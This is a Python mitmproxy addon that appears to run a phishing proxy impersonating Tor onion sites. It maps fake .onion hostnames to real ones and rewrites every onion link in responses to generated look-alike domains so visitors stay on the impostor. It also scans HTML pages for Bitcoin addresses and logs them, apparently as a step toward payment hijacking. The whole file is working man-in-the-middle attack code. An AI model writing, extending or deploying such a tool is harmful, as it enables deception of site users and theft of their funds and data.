from mitmproxy import http
from utils import *
import os
import re

onionRegex = '[a-z2-7]{55}d\.onion'
addressRegex = '([13]|bc1)([A-HJ-NP-Za-km-z1-9]{27,34})[^A-HJ-NP-Za-km-z1-9]'

def request(flow: http.HTTPFlow) -> None:
	if not flow.request:
		return None
	
	print(f'Received request on {flow.request.host}')
	
	if flow.request.host.count(".") == 0:
		print('Impossible - 0 dots')
		return None

	split_host = flow.request.host.split(".")

	if split_host[-1] != 'onion':
		print('Impossible - ending is not .onion')
		return None
	
	real = resolveDomain(split_host[-2])

	if real is None:
		print(f'Impossible situation - domain {split_host[-2]} not in database')
		return None
	
	split_host[-2] = real
	flow.request.host = ".".join(split_host)
	
def response(flow: http.HTTPFlow) -> None:
	if not flow.response:
		return None
	
	#TODO support for ports

	#Search for onions
	onions = re.findall(onionRegex.encode(), flow.response.content)
	if "Location" in flow.response.headers:
		onions += re.findall(onionRegex.encode(), flow.response.headers["Location"].encode())
	onions = [x.decode().replace(".onion", "") for x in set(onions)]

	onions = dict(zip(onions, resolveDomains(onions)))
	need_creation = [k for k,v in onions.items() if v == None]
	created = dict(zip(need_creation, createDomains(need_creation)))
	onions = {**onions, **created}

	for real, unreal in onions.items():
		real += ".onion"
		unreal += ".onion"
		flow.response.content = flow.response.content.replace(real.encode(), unreal.encode())
		if "Location" in flow.response.headers:
			flow.response.headers["Location"] = flow.response.headers["Location"].replace(real, unreal)
	
	if "Content-Type" not in flow.response.headers:
		return flow
	
	if "text/html" not in flow.response.headers["Content-Type"]:
		return flow
	
	matches = re.findall(addressRegex.encode(), flow.response.content)
	btcAddrs = [
		address for address in
		set([b''.join(x).decode() for x in matches]) #join regex groups and decode
		if all(address not in onion for onion in onions.values()) #remove onions mistaken for btc addr
	]
	for btcAddr in btcAddrs:
		print(f"Discovered address {btcAddr}")
